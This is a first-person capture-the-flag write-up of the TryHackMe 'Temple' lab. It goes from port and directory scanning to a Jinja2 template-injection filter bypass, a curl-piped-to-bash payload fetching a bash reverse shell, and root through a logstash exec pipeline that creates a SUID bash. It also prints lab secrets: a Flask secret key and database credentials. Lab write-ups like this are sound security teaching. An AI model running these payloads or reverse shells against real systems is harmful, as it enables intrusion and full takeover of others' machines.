---
title: Temple Write-up
date: 2026-01-25
categories: [TryHackme, Write-up]
tags: [write-up, tutorial, tryhackme]
author: Mohamad Helmi
description: "A simple write-up for Tryhackme room (Temple)"
---

# Am I awake?

Today, I'm gonna share some simple steps on how I solve a hard room from TryHackme (Temple). This is my first write-up so it's gonna be quite boring and lame. But whatever...

### Spoiler alert ⚠️⚠️⚠️

I've enumerate the machine couple days ago, but I didn't manage to get any flags as the time I'm writing, cause the challenge is *SO DAMN HARD BRO*. But I'll continue to update this write-up as I progress along (Hopefully).

So, what did I found so far:
- Hidden directory that redirect us to the register page
- SSTI vulnerability in the register page
- Need some modification on the SSTI payload as the server blacklisted some characters

Okay, that's all I know.

Ohh, btw I'm gonna use attackbox from tryhackme for this cause it's a lot faster than my Kali machine. Enough with yapping, let's get started

---

### Reconnaisance 🌐

Always start with a comprehensive scan. I'll go with **rustscan** to find the open ports.

```
root@ip-10-49-71-145:~/Desktop/lab# rustscan -a 10.49.170.38 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time \u231b

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.49.170.38:7
Open 10.49.170.38:21
Open 10.49.170.38:22
Open 10.49.170.38:23
Open 10.49.170.38:80
Open 10.49.170.38:61337
```

Next, I put all of these ports into a file and use nmap to get more details on these ports.

```
root@ip-10-49-71-145:~/Desktop/lab# nmap -sVC -Pn 10.49.170.38 -vvv -p $(paste -sd, open_ports) -oN nmapscan
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-25 07:27 GMT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:27
Completed NSE at 07:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:27
Completed NSE at 07:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:27
Completed NSE at 07:27, 0.00s elapsed

PORT      STATE SERVICE REASON         VERSION
7/tcp     open  echo    syn-ack ttl 64
21/tcp    open  ftp     syn-ack ttl 64 vsftpd 3.0.3
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9e:30:c5:61:92:84:1b:24:64:86:c3:3b:b7:dc:99:34 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDviuvddkQ0YODd4SKeFpZ+MrHKzDpz6vzQREErpzC5tZOT2AY2XKp7yiRa/XLrylST7MhJ8GhxKSuQHkz7DZczimHCCFV3eNGhNVTVUS2ZGwK1/Ff++73qlEjyTlzdLaOm4QtCceepksuf6Z51LRE79vSMv9xVyVtyRb4XWYBVO9HZmBtQwaBrk6lUCBpF0/NbA6C/LK730rEnvaxpt3N2UeOWrepA5a0OeswS05C3VAt03tfboQQ8apooZSQH798jXg7D4wv7zJMVgmU3i169De7viqGIACD+bac6wp75OsEhMzaUPXhXYY6293W+5Hkwqpq+7Mo02jRSqViEImlb
|   256 78:c3:c3:83:81:73:cb:f1:50:41:f1:9a:d7:bf:3e:d1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZqq+5ThS/qu9HZ+EYhZlNV4rVxxaFfP03DBU5XtAMQM0+u32hawMDfxsTr8NHps0zjcoj1gC9fHTbRg/xHggM=
|   256 ec:ce:b8:f9:57:53:56:63:e9:61:90:12:15:e5:78:4a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPt1Zs9PzQV9rm3cNCQahQxaTyGaX59nzLdrgmyTg3Ee
23/tcp    open  telnet  syn-ack ttl 64 Linux telnetd
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
61337/tcp open  http    syn-ack ttl 64 Werkzeug httpd 2.0.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/2.0.1 Python/3.6.9
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.49.170.38:61337/login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

I always start with low hanging fruits (something that I familiar with). There's **http** that is running on port *80* and *61337*. So open up firefox and browse that two ports.

![default-apache](/assets/img/posts/2026-01-25-temple-writeup/port_80.png){: h='20'}
_Default Ubuntu Apache Page on port 80_

![login-page](/assets/img/posts/2026-01-25-temple-writeup/port_61337.png)
_Login Page on port 61337_

At first, I tried to inject SQL commands in the login fields. But nothing came up. So I continue to enumerate the directories.

```
root@ip-10-49-71-145:~/Desktop/lab# gobuster dir -u http://10.49.170.38:61337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.170.38:61337
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 302) [Size: 218] [--> http://10.49.170.38:61337/login]
/login                (Status: 200) [Size: 1676]
/admin                (Status: 403) [Size: 239]
/account              (Status: 302) [Size: 218] [--> http://10.49.170.38:61337/login]
/external             (Status: 302) [Size: 218] [--> http://10.49.170.38:61337/login]
/logout               (Status: 302) [Size: 218] [--> http://10.49.170.38:61337/login]
/application          (Status: 403) [Size: 239]
/internal             (Status: 302) [Size: 218] [--> http://10.49.170.38:61337/login]
/temporary            (Status: 403) [Size: 239]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================
```

So it seems like most of the directories redirect us to the `/login` and 403 forbidden. Perhaps there are sub-directories. So let's keep on searching.

```
root@ip-10-49-71-145:~/Desktop/lab# gobuster dir -u http://10.49.170.38:61337/temporary -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.170.38:61337/temporary
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dev                  (Status: 403) [Size: 239]
Progress: 9379 / 218276 (4.30%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 9702 / 218276 (4.44%)
===============================================================
Finished
===============================================================
```

When I opened up `http://10.49.170.38:61337/temporary/dev`, it's just blank. So keep on searching.

```
root@ip-10-49-71-145:~/Desktop/lab# gobuster dir -u http://10.49.170.38:61337/temporary/dev -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.170.38:61337/temporary/dev
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/newacc               (Status: 200) [Size: 1886]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================
```

This one is very slow going. But whatever. Finally we found `/newacc` sub-directory, so heading to `http://10.49.170.38:61337/temporary/dev/newacc` shows us a register page where we can try to register a new user.

![register page](/assets/img/posts/2026-01-25-temple-writeup/register_page.png)
_Register Page_

Let's try to register a user.

![register user](/assets/img/posts/2026-01-25-temple-writeup/register_user.png)
_Register succeed_

Then login with the credentials that had been registered.

![user login](/assets/img/posts/2026-01-25-temple-writeup/user_login.png)
_After login_

Voila... I managed to login and found the *FQDN* on the page. Let's put it into our `/etc/hosts` and use it from here on.

---

### SSTI 💉

As we seen from the nmap scan the website is run on `Werkzeug`. If you don't know what it is (including me🙂), google may help.

> Werkzeug (German for "tool") is a powerful and comprehensive Python library providing essential utilities for building Web Server Gateway Interface (WSGI) compliant web applications, offering features like request/response handling, URL routing, HTTP utilities, an interactive debugger, and a development server, often used as the foundation for frameworks like Flask.

Hmm *Flask*? I thinking of templating engine just like `jinja2`. So that's I found it's vulnerable to SSTI. But where can I insert the payload and how I'm gonna validate it? Looking back at the website, there's `account` menu where we can see our registered username being displayed. Maybe I can insert the SSTI payload on the username field and see if the server runs the code.

A simple payload to validate: {% raw %}{{7*7}}{% endraw %}—insert this in the username field.

![validate ssti](/assets/img/posts/2026-01-25-temple-writeup/validate_ssti.png)
_Get rendered_

And we did it. So let's try to insert more payload if can run a command. [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---template-format) comes in handy when you try to find some payload to test. 

Here’s a classic Jinja2 SSTI payloads to execute commands:

{% raw %}
```bash
dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', b'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry'), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```
{% endraw %}

![Error](/assets/img/posts/2026-01-25-temple-writeup/hacking_attempt.png)
_Doesn't work_

It seems like the `_` being filtered out to stop us to sending python class path and `'` characters to filter the strings. Need to do some modifications on the payload to bypass the blocklisting.
But `"` works just fine.

So I google again on how to bypass those characters. So I found [this article](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f). Read all of it and see how they modify the payload.

Look at this:
{% raw %}
```
{{()|attr(‘\x5f\x5fclass\x5f\x5f’)|attr(‘\x5f\x5fbase\x5f\x5f’)|attr(‘\x5f\x5fsubclasses\x5f\x5f’)()|attr(‘\x5f\x5fgetitem\x5f\x5f’)(287)(‘ls’,shell=True,stdout=-1)|attr(‘communicate’)()|attr(‘\x5f\x5fgetitem\x5f\x5f’)(0)|attr(‘decode’)(‘utf-8’)}}
```
{% endraw %}
Ohh right, he changed `_` to hexadecimal which is `\5f`. So I apply the same theory, change the `'` to hexadecimal which is `\27`. So our final payload will looks like this:
{% raw %}
```
{{ self.\5fTemplateReference\5f\5fcontext.cycler.\5f\5finit\5f\5f.\5f\5fglobals\5f\5f.os.popen(\27id\27).read() }}
```
{% endraw %}
So finger crossed, hope it works

![success](/assets/img/posts/2026-01-25-temple-writeup/success.png)
_We did it_

But wait!!!

![internal server error](/assets/img/posts/2026-01-25-temple-writeup/internal_server_error.png)
_Ohhh my bad_

The server decided to throw `500 internal server error`. But wait,, let's do some quick analysis. If we succeed to register an user with the payload, that's meant our payload got executed on the server. what if we try to download a file from our attacker machine to the server. Perhaps it might able to download it.

---

### Foothold 👣

I made a simple bash reverse shell.

```bash
root@ip-10-49-71-145:~/Desktop/lab# cat toyol.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.49.71.145/9001 0>&1
```
*I called it toyol cause it memang toyol*

Use this payload to put in the username field
{% raw %}
```python
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl ATTAKER_IP:PORT/toyol.sh | bash")|attr("read")()}}
```
{% endraw %}

1. Start the python server
```bash
root@ip-10-49-71-145:~/Desktop/lab# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
2. Register new user with the payload
3. Login
4. Click on the `account` menu
5. Catch a shell (Not feelings)

```bash
root@ip-10-49-71-145:~/Desktop/lab# nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.49.170.38 52688
bash: cannot set terminal process group (798): Inappropriate ioctl for device
bash: no job control in this shell
bill@temple:~/webapp$ 
```

---

#### User Bill and logstash 🤚

After a long tweak and twerk here and there, we've finally got a shell on the server. The flag is in bill's home directory.

Okay, now what?

I listed out all the files in the home directory and found another directory called `webapp`. Navigate to the directory, there's another file `webapp.py` and found a database credentials.

```python
def connect_database():

    global connection
    connection = pymysql.connect(host="localhost",
        user="temple_user",
        password="4$pCM!&bEEs$SR8H",
        db="temple",
        cursorclass=pymysql.cursors.DictCursor)
    return connection
```

But after connecting to the mysql server, it just our accounts that we've created to hack in.

Checking the `/etc/passwd` file, I've found there are another accounts. `jenny`, `frankie`, and `princess`. So I try to check the group of each account. And `frankie` has sudo group which we might can use it later on.

After manual recon, I've there's an interesting service going on, `logstash`.

```bash
bill@temple:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.5 159688  5780 ?        Ss   06:21   0:04 /sbin/init maybe-ubiquity
root         2  0.0  0.0      0     0 ?        S    06:21   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   06:21   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   06:21   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    06:21   0:00 [ksoftirqd/0]
root     24802  0.0  0.0      0     0 ?        I    12:08   0:00 [kworker/1:0]
root     24814 21.9 51.3 2921496 505204 ?      SNsl 12:08   4:22 /usr/share/logstash/jdk/bin/java -Xms128m -Xmx256m -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFra
```

Quick google to found out what is `logstash`.
> Logstash is used for “collecting, transforming, and outputting logs. This is realized by using pipelines, which contain input, filter, and output modules. The service gets interesting when having compromised a machine which is running it as a service.”

---

### Privilege escalation 👑

Now, lets check if we meet the prerequisites.

1. We need to be able to write to at least one pipeline (.conf) within conf.d
{% raw %}
```bash
bill@temple:~$ cat /etc/logstash/pipelines.yml 
# This file is where you define your pipelines. You can define multiple.
# For more information on multiple pipelines, see the documentation:
#   https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
```
{% endraw %}
Checked

2. We need `logstash.yml contains config.reload.automatic: true`

```bash
bill@temple:~$ grep config.reload.automatic /etc/logstash/logstash.yml 
config.reload.automatic: true
```
Checked

Using this payload to get the root shell.

```bash
bill@temple:~$ cat /etc/logstash/conf.d/logstash-sample.conf
--snip--
input {
  exec {
    command => "cp /bin/bash /home/bill/rootbash; chmod +xs /home/bill/rootbash"
    interval => 120
  }
}
--snip--
bill@temple:~$ ls -la rootbash 
-rwsr-sr-x 1 root root 1113504 Nov 19 13:53 rootbash
bill@temple:~$ ./rootbash -p
rootbash-4.4# id
uid=1000(bill) gid=1000(bill) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),1000(bill)
```